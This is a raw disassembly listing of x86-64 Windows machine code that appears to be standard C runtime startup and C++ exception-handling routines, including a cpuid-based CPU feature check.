   140001e84:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   140001e89:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   140001e8e:	55                   	push   %rbp
   140001e8f:	57                   	push   %rdi
   140001e90:	41 56                	push   %r14
   140001e92:	48 8b ec             	mov    %rsp,%rbp
   140001e95:	48 83 ec 10          	sub    $0x10,%rsp
   140001e99:	33 c0                	xor    %eax,%eax
   140001e9b:	33 c9                	xor    %ecx,%ecx
   140001e9d:	0f a2                	cpuid
   140001e9f:	44 8b c1             	mov    %ecx,%r8d
   140001ea2:	44 8b d2             	mov    %edx,%r10d
   140001ea5:	41 81 f2 69 6e 65 49 	xor    $0x49656e69,%r10d
   140001eac:	41 81 f0 6e 74 65 6c 	xor    $0x6c65746e,%r8d
   140001eb3:	44 8b cb             	mov    %ebx,%r9d
   140001eb6:	44 8b f0             	mov    %eax,%r14d
   140001eb9:	33 c9                	xor    %ecx,%ecx
   140001ebb:	b8 01 00 00 00       	mov    $0x1,%eax
   140001ec0:	0f a2                	cpuid
   140001ec2:	45 0b d0             	or     %r8d,%r10d
   140001ec5:	89 45 f0             	mov    %eax,-0x10(%rbp)
   140001ec8:	41 81 f1 47 65 6e 75 	xor    $0x756e6547,%r9d
   140001ecf:	89 5d f4             	mov    %ebx,-0xc(%rbp)
   140001ed2:	45 0b d1             	or     %r9d,%r10d
   140001ed5:	89 4d f8             	mov    %ecx,-0x8(%rbp)
   140001ed8:	8b f9                	mov    %ecx,%edi
   140001eda:	89 55 fc             	mov    %edx,-0x4(%rbp)
   140001edd:	75 5b                	jne    0x140001f3a
   140001edf:	48 83 0d 81 81 01 00 	orq    $0xffffffffffffffff,0x18181(%rip)        # 0x14001a068
   140001ee6:	ff 
   140001ee7:	25 f0 3f ff 0f       	and    $0xfff3ff0,%eax
   140001eec:	48 c7 05 69 81 01 00 	movq   $0x8000,0x18169(%rip)        # 0x14001a060
   140001ef3:	00 80 00 00 
   140001ef7:	3d c0 06 01 00       	cmp    $0x106c0,%eax
   140001efc:	74 28                	je     0x140001f26
   140001efe:	3d 60 06 02 00       	cmp    $0x20660,%eax
   140001f03:	74 21                	je     0x140001f26
   140001f05:	3d 70 06 02 00       	cmp    $0x20670,%eax
   140001f0a:	74 1a                	je     0x140001f26
   140001f0c:	05 b0 f9 fc ff       	add    $0xfffcf9b0,%eax
   140001f11:	83 f8 20             	cmp    $0x20,%eax
   140001f14:	77 24                	ja     0x140001f3a
   140001f16:	48 b9 01 00 01 00 01 	movabs $0x100010001,%rcx
   140001f1d:	00 00 00 
   140001f20:	48 0f a3 c1          	bt     %rax,%rcx
   140001f24:	73 14                	jae    0x140001f3a
   140001f26:	44 8b 05 5b 91 01 00 	mov    0x1915b(%rip),%r8d        # 0x14001b088
   140001f2d:	41 83 c8 01          	or     $0x1,%r8d
   140001f31:	44 89 05 50 91 01 00 	mov    %r8d,0x19150(%rip)        # 0x14001b088
   140001f38:	eb 07                	jmp    0x140001f41
   140001f3a:	44 8b 05 47 91 01 00 	mov    0x19147(%rip),%r8d        # 0x14001b088
   140001f41:	45 33 c9             	xor    %r9d,%r9d
   140001f44:	41 8b f1             	mov    %r9d,%esi
   140001f47:	45 8b d1             	mov    %r9d,%r10d
   140001f4a:	45 8b d9             	mov    %r9d,%r11d
   140001f4d:	41 83 fe 07          	cmp    $0x7,%r14d
   140001f51:	7c 65                	jl     0x140001fb8
   140001f53:	41 8d 41 07          	lea    0x7(%r9),%eax
   140001f57:	33 c9                	xor    %ecx,%ecx
   140001f59:	0f a2                	cpuid
   140001f5b:	89 45 f0             	mov    %eax,-0x10(%rbp)
   140001f5e:	8b f2                	mov    %edx,%esi
   140001f60:	89 5d f4             	mov    %ebx,-0xc(%rbp)
   140001f63:	44 8b cb             	mov    %ebx,%r9d
   140001f66:	89 4d f8             	mov    %ecx,-0x8(%rbp)
   140001f69:	89 55 fc             	mov    %edx,-0x4(%rbp)
   140001f6c:	0f ba e3 09          	bt     $0x9,%ebx
   140001f70:	73 0b                	jae    0x140001f7d
   140001f72:	41 83 c8 02          	or     $0x2,%r8d
   140001f76:	44 89 05 0b 91 01 00 	mov    %r8d,0x1910b(%rip)        # 0x14001b088
   140001f7d:	83 f8 01             	cmp    $0x1,%eax
   140001f80:	7c 19                	jl     0x140001f9b
   140001f82:	b8 07 00 00 00       	mov    $0x7,%eax
   140001f87:	8d 48 fa             	lea    -0x6(%rax),%ecx
   140001f8a:	0f a2                	cpuid
   140001f8c:	44 8b d2             	mov    %edx,%r10d
   140001f8f:	89 45 f0             	mov    %eax,-0x10(%rbp)
   140001f92:	89 5d f4             	mov    %ebx,-0xc(%rbp)
   140001f95:	89 4d f8             	mov    %ecx,-0x8(%rbp)
   140001f98:	89 55 fc             	mov    %edx,-0x4(%rbp)
   140001f9b:	b8 24 00 00 00       	mov    $0x24,%eax
   140001fa0:	44 3b f0             	cmp    %eax,%r14d
   140001fa3:	7c 13                	jl     0x140001fb8
   140001fa5:	33 c9                	xor    %ecx,%ecx
   140001fa7:	0f a2                	cpuid
   140001fa9:	44 8b db             	mov    %ebx,%r11d
   140001fac:	89 45 f0             	mov    %eax,-0x10(%rbp)
   140001faf:	89 5d f4             	mov    %ebx,-0xc(%rbp)
   140001fb2:	89 4d f8             	mov    %ecx,-0x8(%rbp)
   140001fb5:	89 55 fc             	mov    %edx,-0x4(%rbp)
   140001fb8:	48 8b 05 91 80 01 00 	mov    0x18091(%rip),%rax        # 0x14001a050
   140001fbf:	bb 06 00 00 00       	mov    $0x6,%ebx
   140001fc4:	48 83 e0 fe          	and    $0xfffffffffffffffe,%rax
   140001fc8:	c7 05 86 80 01 00 01 	movl   $0x1,0x18086(%rip)        # 0x14001a058
   140001fcf:	00 00 00 
   140001fd2:	c7 05 80 80 01 00 02 	movl   $0x2,0x18080(%rip)        # 0x14001a05c
   140001fd9:	00 00 00 
   140001fdc:	48 89 05 6d 80 01 00 	mov    %rax,0x1806d(%rip)        # 0x14001a050
   140001fe3:	0f ba e7 14          	bt     $0x14,%edi
   140001fe7:	73 1b                	jae    0x140002004
   140001fe9:	48 83 e0 ef          	and    $0xffffffffffffffef,%rax
   140001fed:	c7 05 61 80 01 00 02 	movl   $0x2,0x18061(%rip)        # 0x14001a058
   140001ff4:	00 00 00 
   140001ff7:	48 89 05 52 80 01 00 	mov    %rax,0x18052(%rip)        # 0x14001a050
   140001ffe:	89 1d 58 80 01 00    	mov    %ebx,0x18058(%rip)        # 0x14001a05c
   140002004:	0f ba e7 1b          	bt     $0x1b,%edi
   140002008:	0f 83 2b 01 00 00    	jae    0x140002139
   14000200e:	33 c9                	xor    %ecx,%ecx
   140002010:	0f 01 d0             	xgetbv
   140002013:	48 c1 e2 20          	shl    $0x20,%rdx
   140002017:	48 0b d0             	or     %rax,%rdx
   14000201a:	48 89 55 20          	mov    %rdx,0x20(%rbp)
   14000201e:	0f ba e7 1c          	bt     $0x1c,%edi
   140002022:	0f 83 f6 00 00 00    	jae    0x14000211e
   140002028:	48 8b 45 20          	mov    0x20(%rbp),%rax
   14000202c:	22 c3                	and    %bl,%al
   14000202e:	3a c3                	cmp    %bl,%al
   140002030:	0f 85 e8 00 00 00    	jne    0x14000211e
   140002036:	8b 05 20 80 01 00    	mov    0x18020(%rip),%eax        # 0x14001a05c
   14000203c:	b2 e0                	mov    $0xe0,%dl
   14000203e:	83 c8 08             	or     $0x8,%eax
   140002041:	c7 05 0d 80 01 00 03 	movl   $0x3,0x1800d(%rip)        # 0x14001a058
   140002048:	00 00 00 
   14000204b:	89 05 0b 80 01 00    	mov    %eax,0x1800b(%rip)        # 0x14001a05c
   140002051:	41 f6 c1 20          	test   $0x20,%r9b
   140002055:	74 5d                	je     0x1400020b4
   140002057:	83 c8 20             	or     $0x20,%eax
   14000205a:	c7 05 f4 7f 01 00 05 	movl   $0x5,0x17ff4(%rip)        # 0x14001a058
   140002061:	00 00 00 
   140002064:	89 05 f2 7f 01 00    	mov    %eax,0x17ff2(%rip)        # 0x14001a05c
   14000206a:	b9 00 00 03 d0       	mov    $0xd0030000,%ecx
   14000206f:	48 8b 05 da 7f 01 00 	mov    0x17fda(%rip),%rax        # 0x14001a050
   140002076:	44 23 c9             	and    %ecx,%r9d
   140002079:	48 83 e0 fd          	and    $0xfffffffffffffffd,%rax
   14000207d:	48 89 05 cc 7f 01 00 	mov    %rax,0x17fcc(%rip)        # 0x14001a050
   140002084:	44 3b c9             	cmp    %ecx,%r9d
   140002087:	75 32                	jne    0x1400020bb
   140002089:	48 8b 45 20          	mov    0x20(%rbp),%rax
   14000208d:	22 c2                	and    %dl,%al
   14000208f:	3a c2                	cmp    %dl,%al
   140002091:	75 21                	jne    0x1400020b4
   140002093:	48 8b 05 b6 7f 01 00 	mov    0x17fb6(%rip),%rax        # 0x14001a050
   14000209a:	83 0d bb 7f 01 00 40 	orl    $0x40,0x17fbb(%rip)        # 0x14001a05c
   1400020a1:	48 83 e0 db          	and    $0xffffffffffffffdb,%rax
   1400020a5:	89 1d ad 7f 01 00    	mov    %ebx,0x17fad(%rip)        # 0x14001a058
   1400020ab:	48 89 05 9e 7f 01 00 	mov    %rax,0x17f9e(%rip)        # 0x14001a050
   1400020b2:	eb 07                	jmp    0x1400020bb
   1400020b4:	48 8b 05 95 7f 01 00 	mov    0x17f95(%rip),%rax        # 0x14001a050
   1400020bb:	0f ba e6 17          	bt     $0x17,%esi
   1400020bf:	73 0c                	jae    0x1400020cd
   1400020c1:	48 0f ba f0 18       	btr    $0x18,%rax
   1400020c6:	48 89 05 83 7f 01 00 	mov    %rax,0x17f83(%rip)        # 0x14001a050
   1400020cd:	41 0f ba e2 13       	bt     $0x13,%r10d
   1400020d2:	73 4a                	jae    0x14000211e
   1400020d4:	48 8b 45 20          	mov    0x20(%rbp),%rax
   1400020d8:	22 c2                	and    %dl,%al
   1400020da:	3a c2                	cmp    %dl,%al
   1400020dc:	75 40                	jne    0x14000211e
   1400020de:	41 8b cb             	mov    %r11d,%ecx
   1400020e1:	41 8b c3             	mov    %r11d,%eax
   1400020e4:	48 c1 e9 10          	shr    $0x10,%rcx
   1400020e8:	25 ff 00 04 00       	and    $0x400ff,%eax
   1400020ed:	83 e1 07             	and    $0x7,%ecx
   1400020f0:	89 05 8e 8f 01 00    	mov    %eax,0x18f8e(%rip)        # 0x14001b084
   1400020f6:	48 81 c9 28 00 00 01 	or     $0x1000028,%rcx
   1400020fd:	48 f7 d1             	not    %rcx
   140002100:	48 23 0d 49 7f 01 00 	and    0x17f49(%rip),%rcx        # 0x14001a050
   140002107:	48 89 0d 42 7f 01 00 	mov    %rcx,0x17f42(%rip)        # 0x14001a050
   14000210e:	83 f8 01             	cmp    $0x1,%eax
   140002111:	76 0b                	jbe    0x14000211e
   140002113:	48 83 e1 bf          	and    $0xffffffffffffffbf,%rcx
   140002117:	48 89 0d 32 7f 01 00 	mov    %rcx,0x17f32(%rip)        # 0x14001a050
   14000211e:	41 0f ba e2 15       	bt     $0x15,%r10d
   140002123:	73 14                	jae    0x140002139
   140002125:	48 8b 45 20          	mov    0x20(%rbp),%rax
   140002129:	48 0f ba e0 13       	bt     $0x13,%rax
   14000212e:	73 09                	jae    0x140002139
   140002130:	48 0f ba 35 17 7f 01 	btrq   $0x7,0x17f17(%rip)        # 0x14001a050
   140002137:	00 07 
   140002139:	48 8b 5c 24 38       	mov    0x38(%rsp),%rbx
   14000213e:	33 c0                	xor    %eax,%eax
   140002140:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   140002145:	48 83 c4 10          	add    $0x10,%rsp
   140002149:	41 5e                	pop    %r14
   14000214b:	5f                   	pop    %rdi
   14000214c:	5d                   	pop    %rbp
   14000214d:	c3                   	ret
   14000214e:	cc                   	int3
   14000214f:	cc                   	int3
   140002150:	33 c0                	xor    %eax,%eax
   140002152:	39 05 00 9b 01 00    	cmp    %eax,0x19b00(%rip)        # 0x14001bc58
   140002158:	0f 95 c0             	setne  %al
   14000215b:	c3                   	ret
   14000215c:	cc                   	int3
   14000215d:	cc                   	int3
   14000215e:	cc                   	int3
   14000215f:	cc                   	int3
   140002160:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140002165:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   14000216a:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   14000216f:	57                   	push   %rdi
   140002170:	41 54                	push   %r12
   140002172:	41 55                	push   %r13
   140002174:	41 56                	push   %r14
   140002176:	41 57                	push   %r15
   140002178:	48 83 ec 40          	sub    $0x40,%rsp
   14000217c:	48 8b f1             	mov    %rcx,%rsi
   14000217f:	4d 8b f9             	mov    %r9,%r15
   140002182:	49 8b c8             	mov    %r8,%rcx
   140002185:	49 8b e8             	mov    %r8,%rbp
   140002188:	4c 8b ea             	mov    %rdx,%r13
   14000218b:	e8 24 04 00 00       	call   0x1400025b4
   140002190:	4d 8b 67 08          	mov    0x8(%r15),%r12
   140002194:	4d 8b 37             	mov    (%r15),%r14
   140002197:	49 8b 5f 38          	mov    0x38(%r15),%rbx
   14000219b:	4d 2b f4             	sub    %r12,%r14
   14000219e:	f6 46 04 66          	testb  $0x66,0x4(%rsi)
   1400021a2:	41 8b 7f 48          	mov    0x48(%r15),%edi
   1400021a6:	0f 85 f1 00 00 00    	jne    0x14000229d
   1400021ac:	48 89 74 24 30       	mov    %rsi,0x30(%rsp)
   1400021b1:	48 89 6c 24 38       	mov    %rbp,0x38(%rsp)
   1400021b6:	e9 ce 00 00 00       	jmp    0x140002289
   1400021bb:	8b cf                	mov    %edi,%ecx
   1400021bd:	48 03 c9             	add    %rcx,%rcx
   1400021c0:	8b ef                	mov    %edi,%ebp
   1400021c2:	8b 44 cb 04          	mov    0x4(%rbx,%rcx,8),%eax
   1400021c6:	4c 3b f0             	cmp    %rax,%r14
   1400021c9:	0f 82 b8 00 00 00    	jb     0x140002287
   1400021cf:	8b 44 cb 08          	mov    0x8(%rbx,%rcx,8),%eax
   1400021d3:	4c 3b f0             	cmp    %rax,%r14
   1400021d6:	0f 83 ab 00 00 00    	jae    0x140002287
   1400021dc:	83 7c cb 10 00       	cmpl   $0x0,0x10(%rbx,%rcx,8)
   1400021e1:	0f 84 a0 00 00 00    	je     0x140002287
   1400021e7:	83 7c cb 0c 01       	cmpl   $0x1,0xc(%rbx,%rcx,8)
   1400021ec:	74 1b                	je     0x140002209
   1400021ee:	8b 44 cb 0c          	mov    0xc(%rbx,%rcx,8),%eax
   1400021f2:	49 8b d5             	mov    %r13,%rdx
   1400021f5:	49 03 c4             	add    %r12,%rax
   1400021f8:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   1400021fd:	ff d0                	call   *%rax
   1400021ff:	85 c0                	test   %eax,%eax
   140002201:	0f 88 8f 00 00 00    	js     0x140002296
   140002207:	7e 7e                	jle    0x140002287
   140002209:	81 3e 63 73 6d e0    	cmpl   $0xe06d7363,(%rsi)
   14000220f:	75 28                	jne    0x140002239
   140002211:	48 83 3d 77 e1 00 00 	cmpq   $0x0,0xe177(%rip)        # 0x140010390
   140002218:	00 
   140002219:	74 1e                	je     0x140002239
   14000221b:	48 8d 0d 6e e1 00 00 	lea    0xe16e(%rip),%rcx        # 0x140010390
   140002222:	e8 e9 c9 00 00       	call   0x14000ec10
   140002227:	85 c0                	test   %eax,%eax
   140002229:	74 0e                	je     0x140002239
   14000222b:	ba 01 00 00 00       	mov    $0x1,%edx
   140002230:	48 8b ce             	mov    %rsi,%rcx
   140002233:	ff 15 57 e1 00 00    	call   *0xe157(%rip)        # 0x140010390
   140002239:	48 8d 45 01          	lea    0x1(%rbp),%rax
   14000223d:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   140002243:	48 03 c0             	add    %rax,%rax
   140002246:	49 8b d5             	mov    %r13,%rdx
   140002249:	8b 0c c3             	mov    (%rbx,%rax,8),%ecx
   14000224c:	49 03 cc             	add    %r12,%rcx
   14000224f:	e8 2c 03 00 00       	call   0x140002580
   140002254:	44 8b 0e             	mov    (%rsi),%r9d
   140002257:	48 8d 45 01          	lea    0x1(%rbp),%rax
   14000225b:	48 03 c0             	add    %rax,%rax
   14000225e:	4c 8b c6             	mov    %rsi,%r8
   140002261:	49 8b cd             	mov    %r13,%rcx
   140002264:	8b 14 c3             	mov    (%rbx,%rax,8),%edx
   140002267:	49 8b 47 40          	mov    0x40(%r15),%rax
   14000226b:	49 03 d4             	add    %r12,%rdx
   14000226e:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   140002273:	49 8b 47 28          	mov    0x28(%r15),%rax
   140002277:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   14000227c:	ff 15 4e de 00 00    	call   *0xde4e(%rip)        # 0x1400100d0
   140002282:	e8 29 03 00 00       	call   0x1400025b0
   140002287:	ff c7                	inc    %edi
   140002289:	3b 3b                	cmp    (%rbx),%edi
   14000228b:	0f 82 2a ff ff ff    	jb     0x1400021bb
   140002291:	e9 be 00 00 00       	jmp    0x140002354
   140002296:	33 c0                	xor    %eax,%eax
   140002298:	e9 bc 00 00 00       	jmp    0x140002359
   14000229d:	49 8b 6f 20          	mov    0x20(%r15),%rbp
   1400022a1:	49 2b ec             	sub    %r12,%rbp
   1400022a4:	e9 9f 00 00 00       	jmp    0x140002348
   1400022a9:	44 8b cf             	mov    %edi,%r9d
   1400022ac:	4d 03 c9             	add    %r9,%r9
   1400022af:	42 8b 44 cb 04       	mov    0x4(%rbx,%r9,8),%eax
   1400022b4:	4c 3b f0             	cmp    %rax,%r14
   1400022b7:	0f 82 89 00 00 00    	jb     0x140002346
   1400022bd:	42 8b 44 cb 08       	mov    0x8(%rbx,%r9,8),%eax
   1400022c2:	4c 3b f0             	cmp    %rax,%r14
   1400022c5:	73 7f                	jae    0x140002346
   1400022c7:	f6 46 04 20          	testb  $0x20,0x4(%rsi)
   1400022cb:	74 3f                	je     0x14000230c
   1400022cd:	33 d2                	xor    %edx,%edx
   1400022cf:	45 85 c0             	test   %r8d,%r8d
   1400022d2:	74 34                	je     0x140002308
   1400022d4:	8b ca                	mov    %edx,%ecx
   1400022d6:	48 03 c9             	add    %rcx,%rcx
   1400022d9:	8b 44 cb 04          	mov    0x4(%rbx,%rcx,8),%eax
   1400022dd:	48 3b e8             	cmp    %rax,%rbp
   1400022e0:	72 1f                	jb     0x140002301
   1400022e2:	8b 44 cb 08          	mov    0x8(%rbx,%rcx,8),%eax
   1400022e6:	48 3b e8             	cmp    %rax,%rbp
   1400022e9:	73 16                	jae    0x140002301
   1400022eb:	42 8b 44 cb 10       	mov    0x10(%rbx,%r9,8),%eax
   1400022f0:	39 44 cb 10          	cmp    %eax,0x10(%rbx,%rcx,8)
   1400022f4:	75 0b                	jne    0x140002301
   1400022f6:	42 8b 44 cb 0c       	mov    0xc(%rbx,%r9,8),%eax
   1400022fb:	39 44 cb 0c          	cmp    %eax,0xc(%rbx,%rcx,8)
   1400022ff:	74 07                	je     0x140002308
   140002301:	ff c2                	inc    %edx
   140002303:	41 3b d0             	cmp    %r8d,%edx
   140002306:	72 cc                	jb     0x1400022d4
   140002308:	3b 13                	cmp    (%rbx),%edx
   14000230a:	75 48                	jne    0x140002354
   14000230c:	8b c7                	mov    %edi,%eax
   14000230e:	48 ff c0             	inc    %rax
   140002311:	8b cf                	mov    %edi,%ecx
   140002313:	48 03 c0             	add    %rax,%rax
   140002316:	48 03 c9             	add    %rcx,%rcx
   140002319:	83 3c c3 00          	cmpl   $0x0,(%rbx,%rax,8)
   14000231d:	74 10                	je     0x14000232f
   14000231f:	8b 04 c3             	mov    (%rbx,%rax,8),%eax
   140002322:	48 3b e8             	cmp    %rax,%rbp
   140002325:	75 1f                	jne    0x140002346
   140002327:	f6 46 04 20          	testb  $0x20,0x4(%rsi)
   14000232b:	75 27                	jne    0x140002354
   14000232d:	eb 17                	jmp    0x140002346
   14000232f:	8d 47 01             	lea    0x1(%rdi),%eax
   140002332:	49 8b d5             	mov    %r13,%rdx
   140002335:	41 89 47 48          	mov    %eax,0x48(%r15)
   140002339:	44 8b 44 cb 0c       	mov    0xc(%rbx,%rcx,8),%r8d
   14000233e:	b1 01                	mov    $0x1,%cl
   140002340:	4d 03 c4             	add    %r12,%r8
   140002343:	41 ff d0             	call   *%r8
   140002346:	ff c7                	inc    %edi
   140002348:	44 8b 03             	mov    (%rbx),%r8d
   14000234b:	41 3b f8             	cmp    %r8d,%edi
   14000234e:	0f 82 55 ff ff ff    	jb     0x1400022a9
   140002354:	b8 01 00 00 00       	mov    $0x1,%eax
   140002359:	4c 8d 5c 24 40       	lea    0x40(%rsp),%r11
   14000235e:	49 8b 5b 30          	mov    0x30(%r11),%rbx
   140002362:	49 8b 6b 38          	mov    0x38(%r11),%rbp
   140002366:	49 8b 73 40          	mov    0x40(%r11),%rsi
   14000236a:	49 8b e3             	mov    %r11,%rsp
   14000236d:	41 5f                	pop    %r15
   14000236f:	41 5e                	pop    %r14
   140002371:	41 5d                	pop    %r13
   140002373:	41 5c                	pop    %r12
   140002375:	5f                   	pop    %rdi
   140002376:	c3                   	ret
   140002377:	cc                   	int3
   140002378:	48 83 ec 28          	sub    $0x28,%rsp
   14000237c:	e8 d3 03 00 00       	call   0x140002754
   140002381:	84 c0                	test   %al,%al
   140002383:	75 04                	jne    0x140002389
   140002385:	32 c0                	xor    %al,%al
   140002387:	eb 12                	jmp    0x14000239b
   140002389:	e8 5a 03 00 00       	call   0x1400026e8
   14000238e:	84 c0                	test   %al,%al
   140002390:	75 07                	jne    0x140002399
   140002392:	e8 05 04 00 00       	call   0x14000279c
   140002397:	eb ec                	jmp    0x140002385
   140002399:	b0 01                	mov    $0x1,%al
   14000239b:	48 83 c4 28          	add    $0x28,%rsp
   14000239f:	c3                   	ret
   1400023a0:	48 83 ec 28          	sub    $0x28,%rsp
   1400023a4:	84 c9                	test   %cl,%cl
   1400023a6:	75 0a                	jne    0x1400023b2
   1400023a8:	e8 83 03 00 00       	call   0x140002730
   1400023ad:	e8 ea 03 00 00       	call   0x14000279c
   1400023b2:	b0 01                	mov    $0x1,%al
   1400023b4:	48 83 c4 28          	add    $0x28,%rsp
   1400023b8:	c3                   	ret
   1400023b9:	cc                   	int3
   1400023ba:	cc                   	int3
   1400023bb:	cc                   	int3
   1400023bc:	48 3b ca             	cmp    %rdx,%rcx
   1400023bf:	74 19                	je     0x1400023da
   1400023c1:	48 83 c2 09          	add    $0x9,%rdx
   1400023c5:	48 8d 41 09          	lea    0x9(%rcx),%rax
   1400023c9:	48 2b d0             	sub    %rax,%rdx
   1400023cc:	8a 08                	mov    (%rax),%cl
   1400023ce:	3a 0c 10             	cmp    (%rax,%rdx,1),%cl
   1400023d1:	75 0a                	jne    0x1400023dd
   1400023d3:	48 ff c0             	inc    %rax
   1400023d6:	84 c9                	test   %cl,%cl
   1400023d8:	75 f2                	jne    0x1400023cc
   1400023da:	33 c0                	xor    %eax,%eax
   1400023dc:	c3                   	ret
   1400023dd:	1b c0                	sbb    %eax,%eax
   1400023df:	83 c8 01             	or     $0x1,%eax
   1400023e2:	c3                   	ret
   1400023e3:	cc                   	int3
   1400023e4:	48 85 c9             	test   %rcx,%rcx
   1400023e7:	74 67                	je     0x140002450
   1400023e9:	88 54 24 10          	mov    %dl,0x10(%rsp)
   1400023ed:	48 83 ec 48          	sub    $0x48,%rsp
   1400023f1:	81 39 63 73 6d e0    	cmpl   $0xe06d7363,(%rcx)
   1400023f7:	75 53                	jne    0x14000244c
   1400023f9:	83 79 18 04          	cmpl   $0x4,0x18(%rcx)
   1400023fd:	75 4d                	jne    0x14000244c
   1400023ff:	8b 41 20             	mov    0x20(%rcx),%eax
   140002402:	2d 20 05 93 19       	sub    $0x19930520,%eax
   140002407:	83 f8 02             	cmp    $0x2,%eax
   14000240a:	77 40                	ja     0x14000244c
   14000240c:	48 8b 41 30          	mov    0x30(%rcx),%rax
   140002410:	48 85 c0             	test   %rax,%rax
   140002413:	74 37                	je     0x14000244c
   140002415:	48 63 50 04          	movslq 0x4(%rax),%rdx
   140002419:	85 d2                	test   %edx,%edx
   14000241b:	74 11                	je     0x14000242e
   14000241d:	48 03 51 38          	add    0x38(%rcx),%rdx
   140002421:	48 8b 49 28          	mov    0x28(%rcx),%rcx
   140002425:	e8 2a 00 00 00       	call   0x140002454
   14000242a:	eb 20                	jmp    0x14000244c
   14000242c:	eb 1e                	jmp    0x14000244c
   14000242e:	f6 00 10             	testb  $0x10,(%rax)
   140002431:	74 19                	je     0x14000244c
   140002433:	48 8b 41 28          	mov    0x28(%rcx),%rax
   140002437:	48 8b 08             	mov    (%rax),%rcx
   14000243a:	48 85 c9             	test   %rcx,%rcx
   14000243d:	74 0d                	je     0x14000244c
   14000243f:	48 8b 01             	mov    (%rcx),%rax
   140002442:	48 8b 40 10          	mov    0x10(%rax),%rax
   140002446:	ff 15 6c de 00 00    	call   *0xde6c(%rip)        # 0x1400102b8
   14000244c:	48 83 c4 48          	add    $0x48,%rsp
   140002450:	c3                   	ret
   140002451:	cc                   	int3
   140002452:	cc                   	int3
   140002453:	cc                   	int3
   140002454:	48 ff e2             	rex.W jmp *%rdx
   140002457:	cc                   	int3
   140002458:	40 53                	rex push %rbx
   14000245a:	48 83 ec 20          	sub    $0x20,%rsp
   14000245e:	48 8b d9             	mov    %rcx,%rbx
   140002461:	e8 a6 01 00 00       	call   0x14000260c
   140002466:	48 8b 50 58          	mov    0x58(%rax),%rdx
   14000246a:	eb 09                	jmp    0x140002475
   14000246c:	48 39 1a             	cmp    %rbx,(%rdx)
   14000246f:	74 12                	je     0x140002483
   140002471:	48 8b 52 08          	mov    0x8(%rdx),%rdx
   140002475:	48 85 d2             	test   %rdx,%rdx
   140002478:	75 f2                	jne    0x14000246c
   14000247a:	8d 42 01             	lea    0x1(%rdx),%eax
   14000247d:	48 83 c4 20          	add    $0x20,%rsp
   140002481:	5b                   	pop    %rbx
   140002482:	c3                   	ret
   140002483:	33 c0                	xor    %eax,%eax
   140002485:	eb f6                	jmp    0x14000247d
   140002487:	cc                   	int3
   140002488:	48 63 02             	movslq (%rdx),%rax
   14000248b:	48 03 c1             	add    %rcx,%rax
   14000248e:	83 7a 04 00          	cmpl   $0x0,0x4(%rdx)
   140002492:	7c 16                	jl     0x1400024aa
   140002494:	4c 63 4a 04          	movslq 0x4(%rdx),%r9
   140002498:	48 63 52 08          	movslq 0x8(%rdx),%rdx
   14000249c:	49 8b 0c 09          	mov    (%r9,%rcx,1),%rcx
   1400024a0:	4c 63 04 0a          	movslq (%rdx,%rcx,1),%r8
   1400024a4:	4d 03 c1             	add    %r9,%r8
   1400024a7:	49 03 c0             	add    %r8,%rax
   1400024aa:	c3                   	ret
   1400024ab:	cc                   	int3
   1400024ac:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400024b1:	57                   	push   %rdi
   1400024b2:	48 83 ec 20          	sub    $0x20,%rsp
   1400024b6:	48 8b 39             	mov    (%rcx),%rdi
   1400024b9:	48 8b d9             	mov    %rcx,%rbx
   1400024bc:	81 3f 52 43 43 e0    	cmpl   $0xe0434352,(%rdi)
   1400024c2:	74 12                	je     0x1400024d6
   1400024c4:	81 3f 4d 4f 43 e0    	cmpl   $0xe0434f4d,(%rdi)
   1400024ca:	74 0a                	je     0x1400024d6
   1400024cc:	81 3f 63 73 6d e0    	cmpl   $0xe06d7363,(%rdi)
   1400024d2:	74 22                	je     0x1400024f6
   1400024d4:	eb 13                	jmp    0x1400024e9
   1400024d6:	e8 31 01 00 00       	call   0x14000260c
   1400024db:	83 78 30 00          	cmpl   $0x0,0x30(%rax)
   1400024df:	7e 08                	jle    0x1400024e9
   1400024e1:	e8 26 01 00 00       	call   0x14000260c
   1400024e6:	ff 48 30             	decl   0x30(%rax)
   1400024e9:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400024ee:	33 c0                	xor    %eax,%eax
   1400024f0:	48 83 c4 20          	add    $0x20,%rsp
   1400024f4:	5f                   	pop    %rdi
   1400024f5:	c3                   	ret
   1400024f6:	e8 11 01 00 00       	call   0x14000260c
   1400024fb:	48 89 78 20          	mov    %rdi,0x20(%rax)
   1400024ff:	48 8b 5b 08          	mov    0x8(%rbx),%rbx
   140002503:	e8 04 01 00 00       	call   0x14000260c
   140002508:	48 89 58 28          	mov    %rbx,0x28(%rax)
   14000250c:	e8 57 38 00 00       	call   0x140005d68
   140002511:	cc                   	int3
   140002512:	cc                   	int3
   140002513:	cc                   	int3
   140002514:	48 83 ec 28          	sub    $0x28,%rsp
   140002518:	e8 ef 00 00 00       	call   0x14000260c
   14000251d:	48 83 c0 20          	add    $0x20,%rax
   140002521:	48 83 c4 28          	add    $0x28,%rsp
   140002525:	c3                   	ret
   140002526:	cc                   	int3
   140002527:	cc                   	int3
   140002528:	48 83 ec 28          	sub    $0x28,%rsp
   14000252c:	e8 db 00 00 00       	call   0x14000260c
   140002531:	48 83 c0 28          	add    $0x28,%rax
   140002535:	48 83 c4 28          	add    $0x28,%rsp
   140002539:	c3                   	ret
   14000253a:	cc                   	int3
   14000253b:	cc                   	int3
   14000253c:	48 83 ec 28          	sub    $0x28,%rsp
   140002540:	e8 23 38 00 00       	call   0x140005d68
   140002545:	cc                   	int3
   140002546:	cc                   	int3
   140002547:	cc                   	int3
   140002548:	cc                   	int3
   140002549:	cc                   	int3
   14000254a:	cc                   	int3
   14000254b:	cc                   	int3
   14000254c:	cc                   	int3
   14000254d:	cc                   	int3
   14000254e:	cc                   	int3
   14000254f:	cc                   	int3
   140002550:	cc                   	int3
   140002551:	cc                   	int3
   140002552:	cc                   	int3
   140002553:	cc                   	int3
   140002554:	cc                   	int3
   140002555:	cc                   	int3
